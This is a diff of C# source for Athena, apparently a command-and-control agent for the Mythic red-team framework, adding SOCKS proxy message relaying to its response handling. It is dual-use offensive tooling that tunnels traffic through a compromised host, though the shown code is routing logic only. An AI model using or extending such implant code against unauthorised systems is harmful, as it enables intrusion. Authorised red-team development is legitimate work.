@@ -96,7 +96,10 @@ namespace Athena
         public bool SendResponse(Dictionary<string,MythicJob> jobs)
         {
             List<DelegateMessage> delegates = Globals.delegateMessages;
+            List<SocksMessage> socksOut = Globals.socksOut;
+            //This might be causing a race condition.
             Globals.delegateMessages = new List<DelegateMessage>();
+            Globals.socksOut = new List<SocksMessage>();
             List<ResponseResult> lrr = new List<ResponseResult>();
             foreach(var job in jobs.Values)
             {
@@ -261,7 +264,6 @@ namespace Athena
                             ResponseResult rr = new ResponseResult()
                             {
                                 task_id = job.task.id,
-                                //completed = "false",
                                 user_output = job.taskresult,
                                 status = "processed"
                             };
@@ -275,6 +277,7 @@ namespace Athena
             {
                 action = "post_response",
                 responses = lrr,
+                socks = socksOut,
                 delegates = delegates
             };
 
@@ -284,13 +287,20 @@ namespace Athena
                 if (responseString.Contains("chunk_data"))
                 {
                     PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);
-                    if (cs.delegates != null && cs.delegates.Count > 0)
-                    {
-                        foreach (var del in cs.delegates)
-                        {
-                            Globals.outMessages.Add(del);
-                        }
-                    }
+                    //if (cs.delegates != null && cs.delegates.Count > 0)
+                    //{
+                    //    foreach (var del in cs.delegates)
+                    //    {
+                    //        Globals.outMessages.Add(del);
+                    //    }
+                    //}
+                    //if (cs.socks != null && cs.socks.Count > 0)
+                    //{
+                    //    foreach (var s in cs.socks)
+                    //    {
+                    //        Globals.socksIn.Add(s);
+                    //    }
+                    //}
 
                     if (cs == null)
                     {
@@ -299,7 +309,22 @@ namespace Athena
                     }
                     else
                     {
-                        foreach(var response in cs.responses)
+                        if (cs.delegates != null && cs.delegates.Count > 0)
+                        {
+                            foreach (var del in cs.delegates)
+                            {
+                                Globals.outMessages.Add(del);
+                            }
+                        }
+                        if (cs.socks != null && cs.socks.Count > 0)
+                        {
+                            foreach (var s in cs.socks)
+                            {
+                                Globals.socksIn.Add(s);
+                            }
+                        }
+
+                        foreach (var response in cs.responses)
                         {
                             Task.Run(() =>
                             {
@@ -332,14 +357,20 @@ namespace Athena
                 else
                 {
                     PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
-
-                    if (cs.delegates != null && cs.delegates.Count > 0)
-                    {
-                        foreach (var del in cs.delegates)
-                        {
-                            Globals.outMessages.Add(del);
-                        }
-                    }
+                    //if (cs.delegates != null && cs.delegates.Count > 0)
+                    //{
+                    //    foreach (var del in cs.delegates)
+                    //    {
+                    //        Globals.outMessages.Add(del);
+                    //    }
+                    //}
+                    //if (cs.socks != null && cs.socks.Count > 0)
+                    //{
+                    //    foreach (var s in cs.socks)
+                    //    {
+                    //        Globals.socksIn.Add(s);
+                    //    }
+                    //}
 
                     if (string.IsNullOrEmpty(responseString))
                     {
@@ -347,6 +378,23 @@ namespace Athena
                     }
                     else
                     {
+                        //Check for delegates to pass on
+                        if (cs.delegates != null && cs.delegates.Count > 0)
+                        {
+                            foreach (var del in cs.delegates)
+                            {
+                                Globals.outMessages.Add(del);
+                            }
+                        }
+                        //Check for socks messages to pass on
+                        if (cs.socks != null && cs.socks.Count > 0)
+                        {
+                            Console.WriteLine("New Socks Messages.");
+                            foreach (var s in cs.socks)
+                            {
+                                Globals.socksIn.Add(s);
+                            }
+                        }
                         foreach (var response in cs.responses)
                         {
                             if (!String.IsNullOrEmpty(response.file_id))
